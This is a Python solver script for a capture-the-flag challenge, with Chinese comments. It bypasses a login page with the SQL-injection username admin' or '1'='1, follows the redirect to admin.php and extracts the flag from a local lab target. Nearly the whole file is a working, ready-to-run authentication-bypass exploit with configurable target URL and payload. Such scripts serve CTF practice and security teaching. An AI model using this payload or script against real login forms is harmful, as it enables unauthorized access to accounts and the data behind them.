#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
Challenge 02 —— 登录处 SQL 注入认证绕过。

后台登录把 username 直接拼进 SQL，用 admin' or '1'='1 即可绕过密码校验，
服务端 302 跳转到 /admin.php 并下发 session，admin.php 直接显示 flag。

注：原题归类为布尔盲注，但这里能直接绕过登录拿 flag，无需逐字符盲注，
故脚本走最短路径。若后续需要盲注提数据，参考 03 题脚本。
"""

import argparse
import os
import re
import sys

import requests

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33493/")
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")
BYPASS_USER = "admin' or '1'='1"


def make_session() -> requests.Session:
    session = requests.Session()
    session.trust_env = False
    session.headers.update({"User-Agent": "gkdctf-02-helper/1.0"})
    return session


def solve(args: argparse.Namespace) -> str | None:
    base_url = args.url.rstrip("/") + "/"
    session = make_session()
    print(f"[*] Target: {base_url}")

    # 注入 payload 绕过登录，session 自动带 cookie 跟随 302 到 admin.php
    resp = session.post(
        base_url,
        data={"username": args.user, "password": args.password},
        timeout=args.timeout,
        allow_redirects=True,
    )
    print(f"[*] 登录后落地 {resp.url} -> HTTP {resp.status_code}")

    flag = FLAG_RE.search(resp.text)
    if flag:
        return flag.group(0)

    # 兜底：直接再请求一次 admin.php
    admin = session.get(base_url + "admin.php", timeout=args.timeout)
    flag = FLAG_RE.search(admin.text)
    return flag.group(0) if flag else None


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="登录处 SQLi 认证绕过，读取 admin.php 的 flag")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"目标地址，默认 {DEFAULT_URL}")
    parser.add_argument("--user", default=BYPASS_USER, help="注入用的用户名 payload")
    parser.add_argument("--password", default="x", help="密码，随便填")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP 超时秒数")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    try:
        flag = solve(args)
    except requests.RequestException as exc:
        print(f"[-] 请求失败（容器可能挂了或端口变了）：{exc}", file=sys.stderr)
        return 1

    if not flag:
        print("\n[-] 没抓到 flag，确认 payload 是否仍能绕过登录、admin.php 是否回显 flag。")
        return 2

    print(f"\n[+] FLAG: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
